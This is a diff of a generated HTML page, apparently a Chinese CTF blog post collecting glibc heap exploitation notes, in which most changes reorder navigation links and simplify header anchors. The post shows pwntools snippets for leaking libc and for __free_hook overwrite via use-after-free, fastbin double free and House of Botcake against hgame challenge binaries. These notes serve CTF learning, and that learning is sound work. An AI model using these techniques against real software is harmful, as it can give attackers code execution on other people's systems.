@@ -219,9 +219,20 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/tags/">
               
-              分类
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              关于
               
               
             </a>
@@ -241,20 +252,9 @@
           
           
           <li>
-            <a href="/tags/">
+            <a href="/categories/">
               
-              标签
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/about/">
-              
-              关于
+              分类
               
               
             </a>
@@ -420,9 +420,11 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="堆知识合集一"><a href="#堆知识合集一" class="headerlink" title="堆知识合集一"></a>堆知识合集一</h1><p>由于许久没有看堆题了，打算多做点题整理整理</p>
+        <h1>堆知识合集一</h1>
+<p>由于许久没有看堆题了，打算多做点题整理整理</p>
 <p>题目方面主要以<code>hgame</code>和<code>ctf_all_in_one</code>中例题为例子</p>
-<h2 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h2><p>贴一下学习的师傅文章</p>
+<h2 id="chunk结构">chunk结构</h2>
+<p>贴一下学习的师傅文章</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/484926468136">https://www.jianshu.com/p/484926468136</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39563369/article/details/103943077">https://blog.csdn.net/qq_39563369/article/details/103943077</a></p>
 <p>使用中的<code>chunk</code></p>
@@ -451,22 +453,27 @@
 <li><code>struct malloc_chunk*</code>是定义指针，定义的变量大小在32位系统占4个字节，在64位占8个字节。</li>
 <li><code>INTERNAL_SIZE_T</code> :被定义为<code>size_t</code>,在32位系统上是32位无符号整数(<code>4bytes</code>)，在64位系统上是64位无符号整数(<code>8bytes</code>)</li>
 </ul>
-<h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露<code>libc</code></h2><h3 id="知道libc版本"><a href="#知道libc版本" class="headerlink" title="知道libc版本"></a>知道<code>libc</code>版本</h3><p>通过将<code>freebin</code>加入到<code>unsortedbin</code> ，此时<code>unsorted</code>的<code>freebin</code>中的<code>fd</code>即可泄露<code>libc</code>中的<code>main_arena</code>地址</p>
+<h2 id="泄露libc">泄露<code>libc</code></h2>
+<h3 id="知道libc版本">知道<code>libc</code>版本</h3>
+<p>通过将<code>freebin</code>加入到<code>unsortedbin</code> ，此时<code>unsorted</code>的<code>freebin</code>中的<code>fd</code>即可泄露<code>libc</code>中的<code>main_arena</code>地址</p>
 <p>可通过<code>gdb</code>中的<code>vmmap</code>查看<code>libc</code>计算相对地址</p>
 <pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;1.&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
 libc_addr = main_arena_addr - <span class="hljs-number">0x3c4b78</span>
 libc.address = libc_addr</code></pre>
 <p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222111213954-1679370065075-1.png" alt></p>
 <p><code>distance</code>计算偏移</p>
-<h3 id="不知道libc版本"><a href="#不知道libc版本" class="headerlink" title="不知道libc版本"></a>不知道<code>libc</code>版本</h3><p>利用<code>LibcSearcher</code> 搜索 <code>__malloc_hook</code>的地址</p>
+<h3 id="不知道libc版本">不知道<code>libc</code>版本</h3>
+<p>利用<code>LibcSearcher</code> 搜索 <code>__malloc_hook</code>的地址</p>
 <pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> <span class="hljs-comment">#固定的96偏移</span>
 malloc_hook_addr = main_arena_addr - <span class="hljs-number">0x10</span> <span class="hljs-comment">#再减0x10就到 __malloc_hook</span>
 libc=LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,malloc_hook_addr) <span class="hljs-comment">#LibcSearcher</span>
 offset = malloc_hook_addr - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)
 system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)
 free_hook = offset + libc.dump(<span class="hljs-string">&#x27;__free_hook&#x27;</span>)</code></pre>
-<h2 id="题目思路合集"><a href="#题目思路合集" class="headerlink" title="题目思路合集"></a>题目思路合集</h2><p>在泄露了<code>libc</code>地址之后</p>
-<h3 id="Freehook-UAF-hgame-editable-note"><a href="#Freehook-UAF-hgame-editable-note" class="headerlink" title="Freehook + UAF -- hgame editable_note"></a><code>Freehook + UAF -- hgame editable_note</code></h3><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
+<h2 id="题目思路合集">题目思路合集</h2>
+<p>在泄露了<code>libc</code>地址之后</p>
+<h3 id="Freehook-UAF-hgame-editable-note"><code>Freehook + UAF -- hgame editable_note</code></h3>
+<pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
     add_note(i,<span class="hljs-number">0x80</span>)
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
     delete_note(i)
@@ -485,7 +492,8 @@ add_note(<span class="hljs-number">10</span>,<span class="hljs-number">0x80</spa
 edit_note(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#向system传参</span>
 edit_note(<span class="hljs-number">10</span>,p64(system_addr))<span class="hljs-comment">#向free_hook中写入system地址</span>
 delete_note(<span class="hljs-number">9</span>)</code></pre>
-<h3 id="FastBin-DoubleFree-hgame-fast-note"><a href="#FastBin-DoubleFree-hgame-fast-note" class="headerlink" title="FastBin + DoubleFree -- hgame fast_note"></a><code>FastBin + DoubleFree -- hgame fast_note</code></h3><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#大于fastbin</span>
+<h3 id="FastBin-DoubleFree-hgame-fast-note"><code>FastBin + DoubleFree -- hgame fast_note</code></h3>
+<pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#大于fastbin</span>
 add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#避免合并到top chunk</span>
 <span class="hljs-comment">#----泄露libc</span>
 
@@ -542,14 +550,16 @@ delete(<span class="hljs-number">4</span>)
 <span class="hljs-comment">//unsigned int 在64位程序下只取低4字节</span>
 <span class="hljs-comment">//所以此处可以分配fastbin而不会报错！</span></code></pre>
 <p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222112549250-1679370065076-3.png" alt></p>
-<h3 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h3><ol>
-<li><code>pwndbg</code>自动读取工作目录下源码 </li>
-<li><code>r = gdb.debug(&#39;./vuln&#39;, &#39;set debug-file-directory debug/&#39;)``gdb</code>启动程序，而不是<code>attach</code>，并设置调试信息</li>
+<h3 id="源码调试">源码调试</h3>
+<ol>
+<li><code>pwndbg</code>自动读取工作目录下源码</li>
+<li><code>r = gdb.debug('./vuln', 'set debug-file-directory debug/')``gdb</code>启动程序，而不是<code>attach</code>，并设置调试信息</li>
 <li>放<code>glibc-all-in-one</code>的调试信息 即<code>.debug</code>文件夹</li>
 </ol>
 <p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181534392.png" alt></p>
 <p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181949151.png" alt="成功示例"></p>
-<h3 id="House-Of-Botcake-new-fast-note"><a href="#House-Of-Botcake-new-fast-note" class="headerlink" title="House Of Botcake -- new_fast_note"></a><code>House Of Botcake -- new_fast_note</code></h3><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
+<h3 id="House-Of-Botcake-new-fast-note"><code>House Of Botcake -- new_fast_note</code></h3>
+<pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
     add(i,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
 	delete(i)
@@ -726,7 +736,7 @@ delete(<span class="hljs-number">12</span>)</code></pre>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">堆知识合集一</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#chunk%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">chunk结构</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">泄露libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">知道libc版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">不知道libc版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%80%9D%E8%B7%AF%E5%90%88%E9%9B%86"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">题目思路合集</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Freehook-UAF-hgame-editable-note"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">Freehook + UAF -- hgame editable_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#FastBin-DoubleFree-hgame-fast-note"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">FastBin + DoubleFree -- hgame fast_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">源码调试</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#House-Of-Botcake-new-fast-note"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">House Of Botcake -- new_fast_note</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">堆知识合集一</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#chunk%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">chunk结构</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">泄露libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">知道libc版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">不知道libc版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%80%9D%E8%B7%AF%E5%90%88%E9%9B%86"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">题目思路合集</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Freehook-UAF-hgame-editable-note"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">Freehook + UAF -- hgame editable_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#FastBin-DoubleFree-hgame-fast-note"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">FastBin + DoubleFree -- hgame fast_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">源码调试</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#House-Of-Botcake-new-fast-note"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">House Of Botcake -- new_fast_note</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
